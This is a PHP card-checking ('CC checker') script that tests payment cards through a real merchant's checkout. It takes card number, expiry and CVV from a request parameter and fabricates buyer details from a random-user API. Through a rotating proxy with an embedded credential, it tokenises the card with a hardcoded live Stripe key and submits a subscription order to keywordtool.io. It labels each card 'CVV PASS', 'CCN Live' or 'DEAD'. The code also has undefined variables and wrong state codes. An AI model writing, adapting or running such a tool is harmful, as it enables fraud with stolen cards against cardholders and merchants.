<?php

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//



//================[Functions and Variables]================//
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//

//=======================[Proxys]=============================//
$rp1 = array(
  1 => 'hswtuhxo-rotate:g0iaxto4n9bu', /// [ex :- igapfgvg-rotate:4spo27fv5idh]
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e2632b90-0087-43d4-b483-213cb2475cba178460&muid=c6c3e62d-0231-4560-ad2e-3b10269eff0468e325&sid=8fb24205-1983-47f7-80ef-50cf734d2b2346d5c5&payment_user_agent=stripe.js%2F37725c4fd%3B+stripe-js-v3%2F37725c4fd&time_on_page=142588&key=pk_live_51JKKrhAzcQOWQ3TQ3vfkWxg8O41ndKd9x04KeButG2wr4vbsQka43HfxV6Zlst0v48fbIvjLLAFWKYoVYuxg4u0c006gxxOb67&pasted_fields=number');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"token": "','"')));
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://keywordtool.io/system/ajax');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: keywordtool.io',
'method: POST',
'path: /system/ajax',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'cookie: Drupal.visitor.country=bd; __cf_bm=H39Bd9AC72o7VAljjshMdDusGkm5ZshYwIRt.xMOo.w-1646322480-0-AUd1995lxjt3QWFdgA+c14ofwOEKvNcf7k9FgmhRfmMOjx+s2YmvItS7ZcgYdKaoHSkn+Iww005SjvZVP3e1thpYvFSe7ORG06JJIooiUc3OvvaUplkZsZq3Obzx2VX9bg==; __stripe_mid=c6c3e62d-0231-4560-ad2e-3b10269eff0468e325; __stripe_sid=8fb24205-1983-47f7-80ef-50cf734d2b2346d5c5; Drupal.visitor.checkoutFailedPaymentCount=1',
'origin: https://keywordtool.io',
'referer: https://keywordtool.io/checkout?src=google&plan=pro_basic_v2_monthly',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'name='.$name.'+'.$last.'&email='.$email.'&plan=pro_basic_v2_monthly&referer=google&checkout_payment_method=on&braintree_token='.$token.'&device_data=%7B%22device_session_id%22%3A%229ceaa2438569ad5df4660211d9ad7e69%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2278b79135523a08165abccb704ebe9b05%22%7D&stripe_token=&form_build_id=form-tTJ57vEJI0PxwyZ00TJHVmc4igmL1BBcUe4wE1GfbeM&form_id=kt_subscription_checkout_form&_triggering_element_name=op&_triggering_element_value=Subscribe+Now&ajax_html_ids%5B%5D=&ajax_html_ids%5B%5D=header&ajax_html_ids%5B%5D=branding&ajax_html_ids%5B%5D=logo&ajax_html_ids%5B%5D=navbar&ajax_html_ids%5B%5D=menu-first&ajax_html_ids%5B%5D=menu-second&ajax_html_ids%5B%5D=block-kt-pages-user-menu&ajax_html_ids%5B%5D=main&ajax_html_ids%5B%5D=content&ajax_html_ids%5B%5D=block-system-main&ajax_html_ids%5B%5D=kt-subscription-checkout-form&ajax_html_ids%5B%5D=kt-subscription-checkout-form-wrapper&ajax_html_ids%5B%5D=edit-account--2&ajax_html_ids%5B%5D=edit-name--2&ajax_html_ids%5B%5D=edit-email--2&ajax_html_ids%5B%5D=pills-checkout-tab&ajax_html_ids%5B%5D=pills-checkout-stripe-tab&ajax_html_ids%5B%5D=pills-checkout-braintree-tab&ajax_html_ids%5B%5D=pills-checkout-content&ajax_html_ids%5B%5D=pills-checkout-stripe&ajax_html_ids%5B%5D=stripe-card-number&ajax_html_ids%5B%5D=stripe-card-expiry&ajax_html_ids%5B%5D=stripe-card-cvv&ajax_html_ids%5B%5D=pills-checkout-braintree&ajax_html_ids%5B%5D=braintree-card-number&ajax_html_ids%5B%5D=braintree-hosted-field-number&ajax_html_ids%5B%5D=braintree-card-expiry&ajax_html_ids%5B%5D=braintree-hosted-field-expirationDate&ajax_html_ids%5B%5D=braintree-card-cvv&ajax_html_ids%5B%5D=braintree-hosted-field-cvv&ajax_html_ids%5B%5D=edit-payment&ajax_html_ids%5B%5D=edit-actions&ajax_html_ids%5B%5D=edit-submit&ajax_html_ids%5B%5D=footer&ajax_html_ids%5B%5D=footer-first&ajax_html_ids%5B%5D=block-kt-pages-copyright&ajax_html_ids%5B%5D=footer-second&ajax_html_ids%5B%5D=block-kt-locale-language-switcher&ajax_html_ids%5B%5D=braintreeDataFrame-9ceaa2438569ad5df4660211d9ad7e69&ajax_html_ids%5B%5D=ppfnfnclspbfiframe&ajax_html_ids%5B%5D=ppfnfnclsiframe&ajax_page_state%5Btheme%5D=kt_theme&ajax_page_state%5Btheme_token%5D=k-ZoNitck9MC13jwx9CRC5yyHl_zTQSSyKGFTLw71UY&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fcss%2Fstyle.min.css%5D=1&ajax_page_state%5Bjs%5D%5B0%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fclient.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fhosted-fields.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bhttps%3A%2F%2Fjs.braintreegateway.com%2Fweb%2F3.80.0%2Fjs%2Fdata-collector.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-a.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-c.min.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fjs%2Fscript-b.min.js%5D=1');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//


//=======================[MADE BY]==============================//

$MADEBY = "[ (bd)@hackerbd1 ]";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';

}
#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}


# -- [Stolen,Lost,Pickup Responses END ] - #



# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result2,  'Your card has expired.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result2,  'Your card number is incorrect.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
elseif 
(strpos($result2,  '-1')) {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//

curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
?>
